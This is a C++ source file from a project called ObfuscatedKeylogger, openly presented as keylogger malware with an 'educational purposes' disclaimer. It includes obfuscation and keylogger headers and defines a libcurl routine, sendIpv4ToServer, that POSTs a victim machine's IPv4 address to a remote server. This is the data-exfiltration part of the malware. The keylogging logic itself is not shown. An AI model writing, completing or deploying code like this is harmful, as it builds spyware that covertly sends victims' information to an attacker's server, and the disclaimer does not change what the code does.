/*
 * ObfuscatedKeylogger.cpp
 * Author: Alex Zevnoski (Leshenka)
 * Copyright (c) 2024 Alex Zevnoski (Leshenka)
 *
 * This file is part of the ObfuscatedKeylogger project, an educational
 * and experimental project demonstrating obfuscation and data transmission techniques.
 *
 * DISCLAIMER: This software is intended solely for educational purposes.
 * The author does not condone or support illegal or unethical use of this software.
 */

#include <stdio.h>
#include <curl/curl.h>
#include <cstdio>
#include <thread>
#include <chrono>
#include "Obfuscation.h"
#include "Keylogger.h"


int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address) {
	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if (curl) {		
		curl_easy_setopt(curl, CURLOPT_URL, serverUrl);
		
		const char* postData = "ipv4="; 
		char fullData[512];

		snprintf(fullData, sizeof(fullData), "%s%s", postData, ipv4Address);

		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fullData);

		res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
			fprintf(stderr, "curl_easy_perform() faild: %s\n", curl_easy_strerror(res));
			curl_easy_cleanup(curl);
			curl_global_cleanup();
			return 1;
		}

		// Clean up
		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();
	return 0;
}
